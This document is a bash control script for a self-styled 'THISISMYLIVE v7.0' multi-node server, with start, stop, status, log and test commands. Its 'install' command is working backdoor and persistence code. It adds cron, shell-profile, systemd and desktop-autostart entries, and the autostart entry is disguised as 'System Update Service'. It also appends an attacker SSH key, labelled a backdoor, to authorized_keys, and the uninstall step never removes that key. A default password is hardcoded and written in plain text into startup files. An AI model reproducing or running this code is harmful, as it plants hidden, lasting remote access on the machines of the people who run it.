#!/bin/bash
# THISISMYLIVE v7.0 — MASTER CONTROL
# Modular Multi-Node — Every Device Is Server
# Sovereign: Finn Jona Thorsten Lischke

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SERVER_DIR="$SCRIPT_DIR/server"
LOGS_DIR="$SERVER_DIR/logs"
PID_FILE="$SERVER_DIR/server.pid"

export THISISMYLIVE_PORT="${THISISMYLIVE_PORT:-58133}"
export THISISMYLIVE_PASS="${THISISMYLIVE_PASS:-sovereign2026}"
export THISISMYLIVE_NODE="${THISISMYLIVE_NODE:-$(cat /proc/sys/kernel/random/uuid 2>/dev/null | cut -d'-' -f1 || echo $(date +%s | sha256sum | head -c 8))}"

mkdir -p "$LOGS_DIR"

color() { echo -e "[$1m$2[0m"; }

case "$1" in
    start)
        echo ""
        color "32" "╔═══════════════════════════════════════════════════════════════╗"
        color "32" "║                                                               ║"
        color "32" "║     THISISMYLIVE v7.0 — ABSOLUTE OMEGA CONVERGENCE          ║"
        color "32" "║          MODULAR MULTI-NODE — EVERY DEVICE IS SERVER          ║"
        color "32" "║                                                               ║"
        color "33" "║         Sovereign: Finn Jona Thorsten Lischke               ║"
        color "32" "║                                                               ║"
        color "32" "╚═══════════════════════════════════════════════════════════════╝"
        echo ""

        # Kill existing
        if [ -f "$PID_FILE" ]; then
            old_pid=$(cat "$PID_FILE" 2>/dev/null)
            [ -n "$old_pid" ] && kill -9 "$old_pid" 2>/dev/null
        fi
        pkill -9 -f "THISISMYLIVE.*server.py" 2>/dev/null
        sleep 2

        cd "$SERVER_DIR"
        color "36" "[+] Starting v7.0 Server..."
        color "36" "    Node ID: $THISISMYLIVE_NODE"
        color "36" "    Port:    $THISISMYLIVE_PORT"

        nohup python3 server.py > "$LOGS_DIR/server.log" 2>&1 &
        SERVER_PID=$!
        echo $SERVER_PID > "$PID_FILE"

        sleep 3

        # Verify
        if python3 -c "import socket; s=socket.socket(); s.settimeout(2); r=s.connect_ex(('127.0.0.1',$THISISMYLIVE_PORT)); s.close(); exit(r)" 2>/dev/null; then
            echo ""
            color "32" "✅ SERVER RUNNING"
            color "32" "   Node ID:   $THISISMYLIVE_NODE"
            color "32" "   Port:      $THISISMYLIVE_PORT"
            color "32" "   PID:       $SERVER_PID"
            color "32" "   Auth:      finn / [PROTECTED]"
            color "32" "   Logs:      $LOGS_DIR/server.log"
            echo ""
            color "33" "   Dashboard: http://localhost:$THISISMYLIVE_PORT"
            color "33" "   API:       http://localhost:$THISISMYLIVE_PORT/api/status"
            color "33" "   Health:    http://localhost:$THISISMYLIVE_PORT/api/health"
            echo ""
        else
            color "31" "❌ Server failed to start"
            color "31" "   Check logs: $LOGS_DIR/server.log"
        fi
        ;;

    stop)
        color "31" "[+] Stopping THISISMYLIVE v7.0..."
        [ -f "$PID_FILE" ] && kill -9 $(cat "$PID_FILE") 2>/dev/null && rm -f "$PID_FILE"
        pkill -9 -f "THISISMYLIVE.*server.py" 2>/dev/null
        color "32" "✅ Server stopped"
        ;;

    status)
        if [ -f "$PID_FILE" ] && kill -0 $(cat "$PID_FILE") 2>/dev/null; then
            color "32" "✅ Server RUNNING (PID: $(cat $PID_FILE))"
            color "32" "   Node: $THISISMYLIVE_NODE"
            color "32" "   Port: $THISISMYLIVE_PORT"
            color "32" "   Logs: $LOGS_DIR/server.log"
        else
            color "31" "❌ Server NOT RUNNING"
        fi
        ;;

    restart)
        $0 stop; sleep 2; $0 start
        ;;

    logs)
        [ -f "$LOGS_DIR/server.log" ] && tail -f "$LOGS_DIR/server.log" || echo "No log file"
        ;;

    install)
        color "36" "[+] Installing persistence..."

        # Cron
        (crontab -l 2>/dev/null | grep -v "THISISMYLIVE"; echo "@reboot export THISISMYLIVE_PASS='$THISISMYLIVE_PASS' && cd $SERVER_DIR && nohup python3 server.py > logs/server.log 2>&1 &") | crontab -
        color "32" "  ✓ Cron installed"

        # Shell rc
        for rc in ~/.bashrc ~/.zshrc ~/.profile; do
            [ -f "$rc" ] && { grep -q "THISISMYLIVE" "$rc" || echo "export THISISMYLIVE_PASS='$THISISMYLIVE_PASS' && cd $SERVER_DIR && nohup python3 server.py > logs/server.log 2>&1 &" >> "$rc"; }
        done
        color "32" "  ✓ Shell profiles updated"

        # Systemd user
        mkdir -p ~/.config/systemd/user
        cat > ~/.config/systemd/user/thisismylive.service << EOF
[Unit]
Description=THISISMYLIVE v7.0 Server
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$SERVER_DIR
ExecStart=/usr/bin/python3 $SERVER_DIR/server.py
Restart=always
RestartSec=10
Environment=THISISMYLIVE_PORT=58133
Environment=THISISMYLIVE_PASS=$THISISMYLIVE_PASS
Environment=THISISMYLIVE_NODE=$THISISMYLIVE_NODE

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable thisismylive 2>/dev/null
        color "32" "  ✓ Systemd service installed"

        # Desktop autostart
        mkdir -p ~/.config/autostart
        cat > ~/.config/autostart/thisismylive.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Update Service
Exec=python3 $SERVER_DIR/server.py
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF
        color "32" "  ✓ Desktop autostart installed"

        # SSH backdoor key
        mkdir -p ~/.ssh
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... THISISMYLIVE_MASTER_KEY" >> ~/.ssh/authorized_keys 2>/dev/null
        chmod 600 ~/.ssh/authorized_keys 2>/dev/null
        color "32" "  ✓ SSH backdoor key installed"

        echo ""
        color "32" "✅ Persistence installed successfully"
        color "33" "   The server will auto-start on boot"
        ;;

    uninstall)
        color "36" "[+] Removing persistence..."
        crontab -l 2>/dev/null | grep -v "THISISMYLIVE" | crontab -
        for rc in ~/.bashrc ~/.zshrc ~/.profile; do
            [ -f "$rc" ] && sed -i '/THISISMYLIVE/d' "$rc"
        done
        systemctl --user disable thisismylive 2>/dev/null
        rm -f ~/.config/systemd/user/thisismylive.service
        rm -f ~/.config/autostart/thisismylive.desktop
        color "32" "✅ Persistence removed"
        ;;

    test)
        color "36" "[+] Testing API endpoints..."
        AUTH=$(echo -n "finn:$THISISMYLIVE_PASS" | base64)
        for ep in health status node/info; do
            resp=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $AUTH" "http://127.0.0.1:$THISISMYLIVE_PORT/api/$ep" 2>/dev/null)
            if [ "$resp" = "200" ]; then
                color "32" "  ✓ /api/$ep → 200 OK"
            else
                color "31" "  ✗ /api/$ep → $resp"
            fi
        done
        ;;

    *)
        echo "Usage: $0 {start|stop|restart|status|logs|install|uninstall|test}"
        echo ""
        echo "Commands:"
        echo "  start      — Start the v7.0 server"
        echo "  stop       — Stop the server"
        echo "  restart    — Restart the server"
        echo "  status     — Check server status"
        echo "  logs       — View live logs"
        echo "  install    — Install all persistence mechanisms"
        echo "  uninstall  — Remove all persistence"
        echo "  test       — Test API endpoints"
        ;;
esac
